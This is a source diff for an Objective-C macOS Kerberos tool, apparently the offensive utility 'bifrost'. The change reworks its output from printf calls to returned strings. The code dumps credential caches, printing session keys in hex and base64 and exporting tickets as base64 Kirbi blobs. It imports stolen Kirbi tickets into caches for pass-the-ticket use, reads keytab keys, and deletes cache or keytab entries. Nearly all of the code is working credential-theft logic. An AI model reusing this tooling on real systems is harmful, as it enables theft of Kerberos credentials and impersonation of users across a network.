@@ -13,6 +13,14 @@ void printKrbError(krb5_context context, krb5_error_code ret){
     printf("[-] %s\n", error);
     krb5_free_error_message(context, error);
 }
+NSString* getKrbError(krb5_context context, krb5_error_code ret) {
+    const char *error = krb5_get_error_message(context, ret);
+    NSMutableString* krbError = [[NSMutableString alloc] initWithString:@"[-] "];
+    [krbError appendString:[[NSString alloc] initWithCString:error encoding:NSUTF8StringEncoding]];
+    [krbError appendString:@"\n"];
+    krb5_free_error_message(context, error);
+    return krbError;
+}
 
 @implementation bifrost
 -(int)getEncValueFromEnctype:(NSString*)enctypeString{
@@ -35,9 +43,10 @@ void printKrbError(krb5_context context, krb5_error_code ret){
     krb5_error_code ret;
     krb5_ccache id;
     krb5_creds creds;
+    NSMutableString* output = [[NSMutableString alloc] initWithString:@""];
     if ((ret = krb5_init_context (&context) != 0)){
-        printKrbError(context,ret);
-        return NULL;
+        [output appendString:getKrbError(context, ret)];
+        @throw output;
     }
     if(ccache == NULL){
         ret = krb5_cc_default(context, &id);
@@ -45,13 +54,13 @@ void printKrbError(krb5_context context, krb5_error_code ret){
         ret = krb5_cc_resolve(context, ccache, &id);
     }
     if (ret){
-        printKrbError(context,ret);
-        return NULL;
+        [output appendString:getKrbError(context, ret)];
+        @throw output;
     }
     ret = krb5_cc_start_seq_get(context, id, &cursor);
     if (ret){
-        printKrbError(context,ret);
-        return NULL;
+        [output appendString:getKrbError(context, ret)];
+        @throw output;
     }
     while((ret = krb5_cc_next_cred(context, id, &cursor, &creds)) == 0){
         Krb5Ticket tkt;
@@ -82,73 +91,92 @@ void printKrbError(krb5_context context, krb5_error_code ret){
         
         char *client;
         krb5_unparse_name(context, creds.client, &client);
-        printf("\nClient: %s\n", client);
-        printf("Principal: %s\n", principal);
+        [output appendString:[[NSString alloc] initWithFormat:@"\nClient: %s\n", client]];
+        //printf("\nClient: %s\n", client);
+        [output appendString:[[NSString alloc] initWithFormat:@"Principal: %s\n", principal]];
+        //printf("Principal: %s\n", principal);
         if(tkt.app29.enctype29.KerbIntValue == ENCTYPE_AES128_CTS_HMAC_SHA1_96){
-            printf("Key enctype: aes128\n");
+            [output appendString:[[NSString alloc] initWithFormat:@"Key enctype: aes128\n"]];
+            //printf("Key enctype: aes128\n");
         }else if(tkt.app29.enctype29.KerbIntValue == ENCTYPE_DES3_CBC_SHA1){
-            printf("Key enctype: des3\n");
+            [output appendString:[[NSString alloc] initWithFormat:@"Key enctype: des3\n"]];
+            //printf("Key enctype: des3\n");
         }else if(tkt.app29.enctype29.KerbIntValue == ENCTYPE_AES256_CTS_HMAC_SHA1_96){
-            printf("Key enctype: aes256\n");
+            [output appendString:[[NSString alloc] initWithFormat:@"Key enctype: aes256\n"]];
+            //printf("Key enctype: aes256\n");
         }else if(tkt.app29.enctype29.KerbIntValue == ENCTYPE_ARCFOUR_HMAC){
-            printf("Key enctype: rc4");
+            [output appendString:[[NSString alloc] initWithFormat:@"Key enctype: rc4\n"]];
+            //printf("Key enctype: rc4");
         }else{
-            printf("Key enctype: %d\n", tkt.app29.enctype29.KerbIntValue);
+            [output appendString:[[NSString alloc] initWithFormat:@"Key enctype: %d\n", tkt.app29.enctype29.KerbIntValue]];
+            //printf("Key enctype: %d\n", tkt.app29.enctype29.KerbIntValue);
         }
         //printf("\tKey length: %d\n", tkt.app29.key.KerbOctetvalue.length);
-        printf("Key: %s (", [tkt.app29.key.KerbOctetvalue base64EncodedStringWithOptions:0].UTF8String);
+        [output appendString:[[NSString alloc] initWithFormat:@"Key: %s (", [tkt.app29.key.KerbOctetvalue base64EncodedStringWithOptions:0].UTF8String]];
+        //printf("Key: %s (", [tkt.app29.key.KerbOctetvalue base64EncodedStringWithOptions:0].UTF8String);
         for(int i = 0; i < tkt.app29.key.KerbOctetvalue.length; i++){
-            printf("%02X", ((Byte*)tkt.app29.key.KerbOctetvalue.bytes)[i]);
+            [output appendString:[[NSString alloc] initWithFormat:@"%02X", ((Byte*)tkt.app29.key.KerbOctetvalue.bytes)[i]]];
+            //printf("%02X", ((Byte*)tkt.app29.key.KerbOctetvalue.bytes)[i]);
         }
-        printf(")\n");
-        printf("Expires: %s\n", [tkt.app29.end printTimeUTC].UTF8String);
-        printf("Flags: %s\n", describeFlags(tkt.app29.flags.KerbBitValue).UTF8String);
+        //printf(")\n");
+        [output appendString:[[NSString alloc] initWithFormat:@")\n"]];
+        //printf("Expires: %s\n", [tkt.app29.end printTimeUTC].UTF8String);
+        [output appendString:[[NSString alloc] initWithFormat:@"Expires: %s\n", [tkt.app29.end printTimeUTC].UTF8String]];
+        //printf("Flags: %s\n", describeFlags(tkt.app29.flags.KerbBitValue).UTF8String);
+        [output appendString:[[NSString alloc] initWithFormat:@"Flags: %s\n", describeFlags(tkt.app29.flags.KerbBitValue).UTF8String]];
         krb5_authdata **authdata = creds.authdata;
         krb5_authdata curAuthdata;
         if(authdata != NULL){
-            printf("Authdata: ");
+            [output appendString:[[NSString alloc] initWithFormat:@"Authdata: "]];
+            //printf("Authdata: ");
             for(int i = 0; authdata[i] != NULL; i++){
                 curAuthdata = *authdata[i];
                 for(int j = 0; j < curAuthdata.length; j++){
-                    printf("%02X", curAuthdata.contents[j]);
+                    [output appendString:[[NSString alloc] initWithFormat:@"%02X", curAuthdata.contents[j]]];
+                    //printf("%02X", curAuthdata.contents[j]);
                 }
-                printf("\n");
+                [output appendString:[[NSString alloc] initWithFormat:@"\n"]];
+                //printf("\n");
             }
         }
         NSString* xcacheconf = @"X-CACHECONF";
         NSString* nsprincipal = [[NSString alloc] initWithCString:principal encoding:NSUTF8StringEncoding];
         if([nsprincipal containsString:xcacheconf]){
             //krb5_cc_get_config(krb5_context, krb5_ccache,krb5_const_principal,const char *, krb5_data *)
-            printf("Principal type: %s\n", (creds.server->data)[1].data);
-            printf("Ticket Data: \n%s\n", [[[NSData alloc] initWithBytes:creds.ticket.data length:creds.ticket.length] base64EncodedStringWithOptions:0].UTF8String);
+            [output appendString:[[NSString alloc] initWithFormat:@"Principal Type: %s\n", (creds.server->data)[1].data]];
+            //printf("Principal type: %s\n", (creds.server->data)[1].data);
+            [output appendString:[[NSString alloc] initWithFormat:@"Ticket Data: \n%s\n",  [[[NSData alloc] initWithBytes:creds.ticket.data length:creds.ticket.length] base64EncodedStringWithOptions:0].UTF8String]];
+            //printf("Ticket Data: \n%s\n", [[[NSData alloc] initWithBytes:creds.ticket.data length:creds.ticket.length] base64EncodedStringWithOptions:0].UTF8String);
         }
         else{
             tkt.app1 = [[KerbApp1 alloc] initWithObject:[[ASN1_Obj alloc] initWithType:0x61 Length:creds.ticket.length Data:[[NSData alloc] initWithBytes:creds.ticket.data length:creds.ticket.length]]];
             NSData* kirbi = createKirbi(tkt);
-            printf("Kirbi:\n%s\n\n", [kirbi base64EncodedStringWithOptions:0].UTF8String);
+            [output appendString:[[NSString alloc] initWithFormat:@"Kirbi:\n%s\n\n", [kirbi base64EncodedStringWithOptions:0].UTF8String]];
+            //printf("Kirbi:\n%s\n\n", [kirbi base64EncodedStringWithOptions:0].UTF8String);
         }
         krb5_free_cred_contents (context, &creds);
     }
     ret = krb5_cc_end_seq_get(context, id, &cursor);
     if (ret){
-        printKrbError(context,ret);
-        return NULL;
+        [output appendString:getKrbError(context, ret)];
+        @throw output;
     }
     if(destroy && ccache != NULL){
         ret = krb5_cc_destroy (context, id);
         if (ret){
-            printKrbError(context,ret);
-            return NULL;
+            [output appendString:getKrbError(context, ret)];
+            @throw output;
         } else{
-            printf("[+] Removed CCache entry: %s\n", ccache);
+            [output appendString:[[NSString alloc] initWithFormat:@"[+] Removed CCache entry: %s\n", ccache]];
+            //printf("[+] Removed CCache entry: %s\n", ccache);
         }
     }else{
         krb5_cc_close(context, id);
     }
     krb5_free_context(context);
-    return @"Finished";
+    return output;
 }
--(void)listAllCCaches{
+-(NSString*)listAllCCaches{
     krb5_context context;
     krb5_cccol_cursor cursor;
     krb5_cc_cursor cc_cursor;
@@ -156,9 +184,10 @@ void printKrbError(krb5_context context, krb5_error_code ret){
     krb5_ccache entry;
     krb5_principal principal;
     krb5_creds creds;
+    NSMutableString* output = [[NSMutableString alloc] initWithString:@""];
     if ((ret = krb5_init_context (&context) != 0)){
-        printKrbError(context,ret);
-        return;
+        [output appendString:getKrbError(context, ret)];
+        @throw output;
     }
     NSString* defaultName = [[NSString alloc] initWithUTF8String:krb5_cc_default_name(context)];
     krb5_cccol_cursor_new(context, &cursor);
@@ -168,24 +197,27 @@ void printKrbError(krb5_context context, krb5_error_code ret){
         
         ret = krb5_cc_get_principal (context, entry,&principal);
         if(ret){
-            printKrbError(context, ret);
+            [output appendString:getKrbError(context, ret)];
             continue;
         }
         char* principalString;
         krb5_unparse_name(context, principal , &principalString);
         
         if([defaultName isEqualToString:name]){
-            printf("\n[*] Principal: %s\n    Name: %s", principalString, name.UTF8String);
+            [output appendString:[[NSString alloc] initWithFormat:@"\n[*] Principal: %s\n    Name: %s", principalString, name.UTF8String]];
+            //printf("\n[*] Principal: %s\n    Name: %s", principalString, name.UTF8String);
         }else{
-            printf("\n[+] Principal: %s\n    Name: %s", principalString, name.UTF8String);
+            [output appendString:[[NSString alloc] initWithFormat:@"\n[+] Principal: %s\n    Name: %s", principalString, name.UTF8String]];
+            //printf("\n[+] Principal: %s\n    Name: %s", principalString, name.UTF8String);
         }
         // now loop through the entries of that cache and list them (not dump though)
         ret = krb5_cc_start_seq_get(context, entry, &cc_cursor);
         if (ret){
-            printKrbError(context,ret);
-            return;
+            [output appendString:getKrbError(context, ret)];
+            @throw output;
         }
-        printf("\n\tIssued\t\t\t Expires\t\t\t    Principal\t\t\t\t\tFlags\n");
+        [output appendString:[[NSString alloc] initWithFormat:@"\n\tIssued\t\t\t Expires\t\t\t    Principal\t\t\t\t\tFlags\n"]];
+        //printf("\n\tIssued\t\t\t Expires\t\t\t    Principal\t\t\t\t\tFlags\n");
         while((ret = krb5_cc_next_cred(context, entry, &cc_cursor, &creds)) == 0){
             char* principal;
             krb5_unparse_name(context, creds.server, &principal);
@@ -198,8 +230,8 @@ void printKrbError(krb5_context context, krb5_error_code ret){
             NSMutableString* startTime = [[NSMutableString alloc] initWithString:[format stringFromDate:[NSDate dateWithTimeIntervalSince1970:creds.times.starttime]]];
 
             NSMutableString* endTime = [[NSMutableString alloc] initWithString:[format stringFromDate:[NSDate dateWithTimeIntervalSince1970:creds.times.endtime]]];
-            
-            printf("%s\t%s\t%s\t(%s)\n", startTime.UTF8String, endTime.UTF8String, principal, describeFlags(creds.ticket_flags).UTF8String);
+            [output appendString:[[NSString alloc] initWithFormat:@"%s\t%s\t%s\t(%s)\n", startTime.UTF8String, endTime.UTF8String, principal, describeFlags(creds.ticket_flags).UTF8String]];
+            //printf("%s\t%s\t%s\t(%s)\n", startTime.UTF8String, endTime.UTF8String, principal, describeFlags(creds.ticket_flags).UTF8String);
             
             krb5_free_cred_contents (context, &creds);
         }
@@ -209,16 +241,16 @@ void printKrbError(krb5_context context, krb5_error_code ret){
     krb5_cccol_cursor_free(context, &cursor);
     krb5_free_context(context);
     //krb5_cc_get_config(krb5_context, krb5_ccache,krb5_const_principal,const char *, krb5_data *)
-    return;
+    return output;
 }
 -(krb5_creds)createKrb5CredFromKrb5Ticket:(Krb5Ticket)ticket{
     krb5_creds cred;
     krb5_context context;
     krb5_error_code ret;
-    printf("[*] Converting ticket to ccache cred\n");
+    NSMutableString* output = [[NSMutableString alloc] initWithString:@""];
     if ((ret = krb5_init_context (&context) != 0)){
-        printKrbError(context,ret);
-        return cred;
+        [output appendString:getKrbError(context, ret)];
+        @throw output;
     }
     cred.addresses = NULL;
     cred.authdata = NULL;
@@ -234,9 +266,8 @@ void printKrbError(krb5_context context, krb5_error_code ret){
     krb5_principal sname;
     ret = krb5_build_principal(context, &sname, 2, ticket.app29.realm29.KerbGenStringvalue.UTF8String, ticket.app29.sname29.account.KerbGenStringvalue.UTF8String, ticket.app29.sname29.domain.KerbGenStringvalue.UTF8String, nil);
     if (ret){
-        printKrbError(context,ret);
-        printf("[-] Failed to build principal for ccache cred\n");
-        return cred;
+        [output appendString:getKrbError(context, ret)];
+        @throw output;
     }
     cred.server = sname;
     cred.magic = KV5M_CREDS;
@@ -255,12 +286,11 @@ void printKrbError(krb5_context context, krb5_error_code ret){
     krb5_principal cname;
     ret = krb5_build_principal(context, &cname, 1, ticket.app1.realm.KerbGenStringvalue.UTF8String, ticket.app29.cname.username.KerbGenStringvalue.UTF8String, nil);
     if (ret){
-        printKrbError(context,ret);
-        printf("[-] Failed to build principal for ccache cred\n");
-        return cred;
+        [output appendString:getKrbError(context, ret)];
+        @throw output;
     }
     cred.client = cname;
-    printf("[+] Successfully converted ticket to ccache cred\n");
+    //printf("[+] Successfully converted ticket to ccache cred\n");
     return cred;
 }
 -(NSString*)importCred:(NSString*)ticketKirbi ToCache:(NSString*)cacheName{
@@ -268,131 +298,145 @@ void printKrbError(krb5_context context, krb5_error_code ret){
     krb5_context context;
     krb5_error_code ret;
     krb5_creds cred;
+    NSMutableString* output = [[NSMutableString alloc] initWithString:@""];
     Krb5Ticket ticket = parseKirbi([[NSData alloc] initWithBase64EncodedString:ticketKirbi options:0]);
     if(ticket.app29 == NULL){
-        printf("[-] Failed to parse Kirbi data\n");
-        return NULL;
+        [output appendString:[[NSString alloc] initWithFormat:@"[-] Failed to parse Kirbi data\n"]];
+        //printf("[-] Failed to parse Kirbi data\n");
+        @throw output;
     }else{
-        printf("[+] Successfully parsed Kirbi data\n");
+        [output appendString:[[NSString alloc] initWithFormat:@"[+] Successfully parsed Kirbi data\n"]];
+        //printf("[+] Successfully parsed Kirbi data\n");
     }
     cred = [self createKrb5CredFromKrb5Ticket:ticket];
     if ((ret = krb5_init_context (&context) != 0)){
-        printKrbError(context,ret);
-        return NULL;
+        [output appendString:getKrbError(context, ret)];
+        @throw output;
     }
     if([cacheName isEqualToString:@"new"]){
-        printf("[*] Creating new ccache\n");
+        [output appendString:[[NSString alloc] initWithFormat:@"[*] Creating new ccache\n"]];
+        //printf("[*] Creating new ccache\n");
         ret = krb5_cc_new_unique( context,"API","test", &cache);
         if(ret){
-            printKrbError(context,ret);
-            printf("[-] Failed to create new ccache\n");
-            return NULL;
+            [output appendString:getKrbError(context, ret)];
+            @throw output;
         }
         //krb5_cc_initialize(context, entry, principal);
         ret = krb5_cc_initialize(context, cache, cred.client);
     }else{
-        printf("[*] Resolving ccache name %s\n", cacheName.UTF8String);
+        [output appendString:[[NSString alloc] initWithFormat:@"[*] Resolving ccache name %s\n", cacheName.UTF8String]];
+        //printf("[*] Resolving ccache name %s\n", cacheName.UTF8String);
         ret = krb5_cc_resolve(context, cacheName.UTF8String, &cache);
     }
     if(ret){
-        printKrbError(context,ret);
-        printf("[-] Failed to get ccache\n");
-        return NULL;
+        [output appendString:getKrbError(context, ret)];
+        @throw output;
     }
     //krb5_cc_store_cred (krb5_context context, krb5_ccache cache, krb5_creds *creds)
-    printf("[*] Saving credential for %s\n", [ticket.app29.sname29 getNSString].UTF8String);
+    [output appendString:[[NSString alloc] initWithFormat:@"[*] Saving credential for %s\n", [ticket.app29.sname29 getNSString].UTF8String]];
+    //printf("[*] Saving credential for %s\n", [ticket.app29.sname29 getNSString].UTF8String);
     ret = krb5_cc_store_cred(context, cache, &cred);
     if(ret){
-        printKrbError(context,ret);
-        printf("[-] Failed to store cred, trying to initialize first\n");
+        [output appendString:getKrbError(context, ret)];
+        //printKrbError(context,ret);
+        //printf("[-] Failed to store cred, trying to initialize first\n");
         //can't store cred to a new store without initializing it, so make sure to do that if storing fails
         ret = krb5_cc_initialize(context, cache, cred.client);
         if(ret){
-            printKrbError(context,ret);
-            printf("[-] Failed to initialize cache\n");
-            return NULL;
+            [output appendString:getKrbError(context, ret)];
+            @throw output;
         }
-        printf("[+] Successfully initialized cache\n");
+        [output appendString:[[NSString alloc] initWithFormat:@"[+] Successfully initialized cache\n"]];
+        //printf("[+] Successfully initialized cache\n");
     }
     ret = krb5_cc_store_cred(context, cache, &cred);
     if(ret){
-        printKrbError(context, ret);
-        printf("[-] Failed to store credential\n");
-        return NULL;
+        [output appendString:getKrbError(context, ret)];
+        @throw output;
     }
-    printf("[+] Successfully imported credential\n");
-    return [[NSString alloc] initWithFormat:@"%s", krb5_cc_get_name(context, cache) ];
+    [output appendString:[[NSString alloc] initWithFormat:@"[+] Successfully imported credential to: %s\n", krb5_cc_get_name(context, cache)]];
+    //printf("[+] Successfully imported credential\n");
+    return output;
 }
 -(NSString*)removeCacheName:(NSString*)cacheName{
     //krb5_cc_destroy (context, entry);
     krb5_context context;
     krb5_error_code ret;
     krb5_ccache cache;
+    NSMutableString* output = [[NSMutableString alloc] initWithString:@""];
     if ((ret = krb5_init_context (&context) != 0)){
-        printKrbError(context,ret);
-        return @"error\n";
+        [output appendString:getKrbError(context, ret)];
+        @throw output;
     }
-    printf("[*] Resolving CCache name: %s\n", cacheName.UTF8String);
+    [output appendString:[[NSString alloc] initWithFormat:@"[*] Resolving CCache name: %s\n", cacheName.UTF8String]];
+    //printf("[*] Resolving CCache name: %s\n", cacheName.UTF8String);
     ret = krb5_cc_resolve(context, cacheName.UTF8String, &cache);
     if(ret){
-        printKrbError(context, ret);
-        return @"error\n";
+        [output appendString:getKrbError(context, ret)];
+        @throw output;
     }
-    printf("[+] Successfully resolved CCache name\n");
+    [output appendString:[[NSString alloc] initWithFormat:@"[+] Successfully resolved CCache name\n"]];
+    //printf("[+] Successfully resolved CCache name\n");
     ret = krb5_cc_destroy(context, cache);
     if(ret){
-        printKrbError(context, ret);
-        return @"error\n";
+        [output appendString:getKrbError(context, ret)];
+        @throw output;
     }
-    printf("[+] Successfully removed CCache\n");
-    return @"success\n";
+    [output appendString:[[NSString alloc] initWithFormat:@"[+] Successfully removed CCache\n"]];
+    //printf("[+] Successfully removed CCache\n");
+    return output;
 }
 -(NSString*)removePrincipal:(NSString*)principal FromCacheName:(NSString*)cacheName{
     //krb5_cc_remove_cred is not implemented by the MITKerberosShim, need to find a different way
     //krb5_cc_remove_cred (krb5_context context, krb5_ccache cache, krb5_flags flags,krb5_creds *creds)
-    NSString* result = @"[-] Failed to find principal\n";
+    //NSString* result = @"[-] Failed to find principal\n";
     krb5_context context;
     krb5_error_code ret;
     krb5_ccache cache;
     krb5_cc_cursor cc_cursor;
     krb5_creds creds;
+    NSMutableString* output = [[NSMutableString alloc] initWithString:@""];
     if ((ret = krb5_init_context (&context) != 0)){
-        printKrbError(context,ret);
-        return @"error\n";
+        [output appendString:getKrbError(context, ret)];
+        @throw output;
     }
     ret = krb5_cc_resolve(context, cacheName.UTF8String, &cache);
     if(ret){
-        printKrbError(context, ret);
-        return @"error\n";
+        [output appendString:getKrbError(context, ret)];
+        @throw output;
     }
-    printf("[+] Successfully resolved CCache name\n");
+    [output appendString:@"[+] Successfully resolved CCache name\n"];
+    //printf("[+] Successfully resolved CCache name\n");
     //now actually loop through the cache to find the specified principal
     ret = krb5_cc_start_seq_get(context, cache, &cc_cursor);
     if (ret){
-        printKrbError(context,ret);
-        return @"error\n";
+        [output appendString:getKrbError(context, ret)];
+        @throw output;
     }
     while((ret = krb5_cc_next_cred(context, cache, &cc_cursor, &creds)) == 0){
         char* curPrincipal;
         krb5_unparse_name(context, creds.server, &curPrincipal);
         if(strcmp(principal.UTF8String, curPrincipal) == 0){
             //we found the right principal, so now we need to remove it
-            printf("[+] Found Principal entry\n");
+            [output appendString:@"[+] Found Principal entry\n"];
+            //printf("[+] Found Principal entry\n");
             //MITKerberosShim: function krb5_cc_remove_cred not implemented :'(
             ret = krb5_cc_remove_cred(context, cache, 8, &creds);
             if(ret){
-                printf("[-] Failed to remove cred\n");
-                printKrbError(context, ret);
-                result = @"error\n";
+                //printf("[-] Failed to remove cred\n");
+                [output appendString:getKrbError(context, ret)];
+                //printKrbError(context, ret);
+                //result = @"error\n";
             }else{
-                result = @"[+] Successfully removed\n";
+                [output appendString:@"[+] Successfully removed\n"];
+                //result = @"[+] Successfully removed\n";
             }
         }
         krb5_free_cred_contents (context, &creds);
     }
     krb5_cc_end_seq_get(context, cache, &cc_cursor);
     krb5_cc_close(context, cache);
-    return result;
+    return output;
 }
 -(NSString*)ktutilKeyTabPath:(NSString*)keyTabPath{
     krb5_context context;
@@ -402,73 +446,88 @@ void printKrbError(krb5_context context, krb5_error_code ret){
     krb5_error_code ret;
     krb5_keyblock key;
     char *principal;
+    NSMutableString* output = [[NSMutableString alloc] initWithString:@""];
     if ((ret = krb5_init_context (&context) != 0)){
-        printKrbError(context,ret);
-        return @"Error";
+        [output appendString:getKrbError(context, ret)];
+        @throw output;
     }
     if(keyTabPath != NULL){
-        printf("[*] Resolving keytab path\n");
+        [output appendString:[[NSString alloc] initWithFormat:@"[*] Resolving keytab path\n"]];
+        //printf("[*] Resolving keytab path\n");
         ret = krb5_kt_resolve(context, keyTabPath.fileSystemRepresentation, &keytab);
     }else{
-        printf("[*] Resolving default keytab path\n");
+        [output appendString:[[NSString alloc] initWithFormat:@"[*] Resolving default keytab path\n"]];
+        //printf("[*] Resolving default keytab path\n");
         ret = krb5_kt_default (context, &keytab);
     }
     if (ret){
-        printKrbError(context,ret);
-        return @"Error";
+        [output appendString:getKrbError(context, ret)];
+        @throw output;
     }
     
     ret = krb5_kt_start_seq_get(context, keytab, &cursor);
     if (ret){
-       printKrbError(context,ret);
-        return @"Error";
+        [output appendString:getKrbError(context, ret)];
+        @throw output;
     }
-    printf("[+] Successfully opened keytab\n");
+    [output appendString:[[NSString alloc] initWithFormat:@"[+] Successfully opened keytab\n"]];
+    //printf("[+] Successfully opened keytab\n");
     while((ret = krb5_kt_next_entry(context, keytab, &entry, &cursor)) == 0){
         krb5_unparse_name(context, entry.principal, &principal);
-        printf("[+] principal: %s\n", principal);
+        [output appendString:[[NSString alloc] initWithFormat:@"[+] principal: %s\n", principal]];
+        //printf("[+] principal: %s\n", principal);
         key = entry.key;
-        printf("\tEntry version: %d\n", entry.vno);
+        [output appendString:[[NSString alloc] initWithFormat:@"\tEntry version: %d\n", entry.vno]];
+        //printf("\tEntry version: %d\n", entry.vno);
         if(key.enctype == ENCTYPE_AES128_CTS_HMAC_SHA1_96){
-            printf("\tKey enctype: aes128\n");
+            [output appendString:[[NSString alloc] initWithFormat:@"\tKey enctype: aes128\n"]];
+            //printf("\tKey enctype: aes128\n");
         }else if(key.enctype == ENCTYPE_DES3_CBC_SHA1){
-            printf("\tKey enctype: des3\n");
+            [output appendString:[[NSString alloc] initWithFormat:@"\tKey enctype: des3\n"]];
+            //printf("\tKey enctype: des3\n");
         }else if(key.enctype == ENCTYPE_AES256_CTS_HMAC_SHA1_96){
-            printf("\tKey enctype: aes256\n");
+            [output appendString:[[NSString alloc] initWithFormat:@"\tKey enctype: aes256\n"]];
+            //printf("\tKey enctype: aes256\n");
         }else if(key.enctype == ENCTYPE_ARCFOUR_HMAC){
-            printf("\tKey enctype: rc4\n");
+            [output appendString:[[NSString alloc] initWithFormat:@"\tKey enctype: rc4\n"]];
+            //printf("\tKey enctype: rc4\n");
         }
         else{
-            printf("\tKey enctype: %d\n", key.enctype);
+            [output appendString:[[NSString alloc] initWithFormat:@"\tKey enctype: %d\n", key.enctype]];
+            //printf("\tKey enctype: %d\n", key.enctype);
         }
         //printf("Key length: %d\n", key.length);
-        printf("\tKey: ");
+        [output appendString:[[NSString alloc] initWithFormat:@"\tKey: "]];
+        //printf("\tKey: ");
         for(int i = 0; i < key.length; i++){
-            printf("%02X", key.contents[i]);
+            [output appendString:[[NSString alloc] initWithFormat:@"%02X", key.contents[i]]];
+            //printf("%02X", key.contents[i]);
         }
-        printf("\n");
+        [output appendString:[[NSString alloc] initWithFormat:@"\n"]];
+        //printf("\n");
         NSDateFormatter *newFormatter = [[NSDateFormatter alloc] init];
         newFormatter.dateFormat = @"YYYY-MM-dd HH:mm:ss z";
         newFormatter.timeZone = [NSTimeZone timeZoneWithAbbreviation:@"UTC"];
         NSDate* ticketTime = [[NSDate alloc] initWithTimeIntervalSince1970:entry.timestamp ];
-        printf("\tTimestamp: %s\n",[newFormatter stringFromDate:ticketTime].UTF8String );
+        [output appendString:[[NSString alloc] initWithFormat:@"\tTimestamp: %s\n",[newFormatter stringFromDate:ticketTime].UTF8String]];
+        //printf("\tTimestamp: %s\n",[newFormatter stringFromDate:ticketTime].UTF8String );
         free(principal);
         //krb5_kt_free_entry(context, &entry);
     }
     ret = krb5_kt_end_seq_get(context, keytab, &cursor);
     if (ret){
-        printKrbError(context,ret);
-        return @"Error";
+        [output appendString:getKrbError(context, ret)];
+        @throw output;
     }
         //krb5_err(context, 1, ret, "krb5_kt_end_seq_get");
     ret = krb5_kt_close(context, keytab);
     if (ret){
-        printKrbError(context,ret);
-        return @"Error";
+        [output appendString:getKrbError(context, ret)];
+        @throw output;
     }
         //krb5_err(context, 1, ret, "krb5_kt_close");
     krb5_free_context(context);
-    return @"Finished";
+    return output;
 }
 -(NSString*)removePrincipal:(NSString*)targetPrincipal fromKeytab:(NSString*)keyTabPath{
     krb5_context context;
@@ -477,39 +536,47 @@ void printKrbError(krb5_context context, krb5_error_code ret){
     krb5_keytab_entry entry;
     krb5_error_code ret;
     char *principal;
+    NSMutableString* output = [[NSMutableString alloc] initWithString:@""];
     if ((ret = krb5_init_context (&context) != 0)){
-        printKrbError(context,ret);
-        return @"Error";
+        [output appendString:getKrbError(context, ret)];
+        @throw output;
     }
     if(keyTabPath != NULL){
-        printf("[*] Resolving keytab path\n");
+        [output appendString:[[NSString alloc] initWithFormat:@"[*] Resolving keytab path\n"]];
+        //printf("[*] Resolving keytab path\n");
         ret = krb5_kt_resolve(context, keyTabPath.fileSystemRepresentation, &keytab);
     }else{
-        printf("[*] Resolving default keytab path\n");
+        [output appendString:[[NSString alloc] initWithFormat:@"[*] Resolving default keytab path\n"]];
+        //printf("[*] Resolving default keytab path\n");
         ret = krb5_kt_default (context, &keytab);
     }
     if (ret){
-        printKrbError(context,ret);
-        return @"Error";
+        [output appendString:getKrbError(context, ret)];
+        @throw output;
     }
     
     ret = krb5_kt_start_seq_get(context, keytab, &cursor);
     if (ret){
-       printKrbError(context,ret);
-        return @"Error";
+        [output appendString:getKrbError(context, ret)];
+        @throw output;
     }
-    printf("[+] Successfully opened keytab\n");
-    printf("[*] Searching for principal\n");
+    [output appendString:[[NSString alloc] initWithFormat:@"[+] Successfully opened keytab\n"]];
+    //printf("[+] Successfully opened keytab\n");
+    [output appendString:[[NSString alloc] initWithFormat:@"[*] Searching for principal\n"]];
+    //printf("[*] Searching for principal\n");
     while((ret = krb5_kt_next_entry(context, keytab, &entry, &cursor)) == 0){
         krb5_unparse_name(context, entry.principal, &principal);
         if(strcmp(principal, targetPrincipal.UTF8String) == 0){
-            printf("[*] Found match, removing entry\n");
+            [output appendString:[[NSString alloc] initWithFormat:@"[*] Found match, removing entry\n"]];
+            //printf("[*] Found match, removing entry\n");
             ret = krb5_kt_remove_entry(context, keytab, &entry);
             if(ret){
-                printf("[-] Failed to remove entry: %s, %d\n", principal, entry.key.enctype);
+                [output appendString:[[NSString alloc] initWithFormat:@"[-] Failed to remove entry: %s, %d\n", principal, entry.key.enctype]];
+                //printf("[-] Failed to remove entry: %s, %d\n", principal, entry.key.enctype);
                 continue;
             }else{
-                printf("[+] Successfully removed entry: %s\n", principal);
+                [output appendString:[[NSString alloc] initWithFormat:@"[+] Successfully removed entry: %s\n", principal]];
+                //printf("[+] Successfully removed entry: %s\n", principal);
             }
         }else{
             free(principal);
@@ -518,18 +585,18 @@ void printKrbError(krb5_context context, krb5_error_code ret){
     }
     ret = krb5_kt_end_seq_get(context, keytab, &cursor);
     if (ret){
-        printKrbError(context,ret);
-        return @"Error";
+        [output appendString:getKrbError(context, ret)];
+        @throw output;
     }
         //krb5_err(context, 1, ret, "krb5_kt_end_seq_get");
     ret = krb5_kt_close(context, keytab);
     if (ret){
-        printKrbError(context,ret);
-        return @"Error";
+        [output appendString:getKrbError(context, ret)];
+        @throw output;
     }
         //krb5_err(context, 1, ret, "krb5_kt_close");
     krb5_free_context(context);
-    return @"Finished";
+    return output;
 }
 -(NSString*)getKeyFromKeytab:(NSString*)keyTabPath andPrincipal:(NSString*)targetPrincipal withEnctype:(int)enctype{
     NSMutableString* hash = NULL;
@@ -539,34 +606,35 @@ void printKrbError(krb5_context context, krb5_error_code ret){
     krb5_keytab_entry entry;
     krb5_error_code ret;
     char *principal;
+    NSMutableString* output = [[NSMutableString alloc] initWithString:@""];
     if ((ret = krb5_init_context (&context) != 0)){
-        printKrbError(context,ret);
-        return NULL;
+        [output appendString:getKrbError(context, ret)];
+        @throw output;
     }
     if(keyTabPath != NULL){
-        printf("[*] Resolving keytab path: %s\n", keyTabPath.UTF8String);
+        //printf("[*] Resolving keytab path: %s\n", keyTabPath.UTF8String);
         ret = krb5_kt_resolve(context, keyTabPath.fileSystemRepresentation, &keytab);
     }else{
-        printf("[*] Resolving default keytab path\n");
+        //printf("[*] Resolving default keytab path\n");
         ret = krb5_kt_default (context, &keytab);
     }
     if (ret){
-        printKrbError(context,ret);
-        return NULL;
+        [output appendString:getKrbError(context, ret)];
+        @throw output;
     }
     ret = krb5_kt_start_seq_get(context, keytab, &cursor);
     if (ret){
-        printKrbError(context,ret);
-        return NULL;
+        [output appendString:getKrbError(context, ret)];
+        @throw output;
     }
-    printf("[+] Successfully opened keytab\n");
-    printf("[*] Searching for principal: %s\n", targetPrincipal.UTF8String);
+    //printf("[+] Successfully opened keytab\n");
+    //printf("[*] Searching for principal: %s\n", targetPrincipal.UTF8String);
     while((ret = krb5_kt_next_entry(context, keytab, &entry, &cursor)) == 0){
         krb5_unparse_name(context, entry.principal, &principal);
